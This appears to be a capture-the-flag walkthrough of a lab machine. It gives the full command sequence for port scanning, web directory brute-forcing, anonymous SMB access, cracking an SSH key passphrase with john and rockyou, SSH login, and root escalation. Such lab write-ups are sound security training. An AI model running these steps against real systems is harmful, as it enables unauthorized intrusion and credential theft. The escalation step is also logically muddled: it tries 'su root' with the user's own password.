# **Pentest Walkthrough: Target 0.0.0.0**

## **1. Initial Reconnaissance (Port Scanning)**

Scan the target for open ports and services:

```bash
nmap -v -A -Pn 0.0.0.0
```

- Found **port 80 (HTTP)** open.
- The webpage shows the message: **"Undergoing maintenance."**

---

## **2. Directory Bruteforce (Web Enumeration)**

Look for hidden directories and files:

```bash
dirb http://0.0.0.0 -w /usr/share/dirb/big.txt
```

- Found `/development/` directory.
- Contains two interesting `.txt` files:
    - Mentions **weak credentials**.
    - Hints at **SMB** service and reveals the **first letter of username**.

---

## **3. SMB Enumeration**

List available SMB shares:

```bash
smbclient -L //0.0.0.0 -N
```

- Found an **Anonymous** share.

Access the share:

```bash
smbclient //0.0.0.0/Anonymous -N
```

- Retrieved files containing usernames:
    
    - **kay**
    - **jan**

---

## **4. SSH Key Retrieval & Cracking**

Found SSH keys inside SMB share:

- Private key: `id_rsa`
- Public key: `id_rsa.pub`  
    (The public key notes that no password is required for login.)

Crack the SSH private key passphrase:

```bash
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

- Successfully cracked the passphrase.

---

## **5. SSH Access & Privilege Escalation**

SSH into the target:

```bash
ssh -i id_rsa kay@0.0.0.0
```

Inside Kay's home directory, found `pass.bak` containing Kay's password.

Switch to root or escalate privileges using Kayâ€™s password:

```bash
su root
```

or use it wherever needed to gain **root access**.
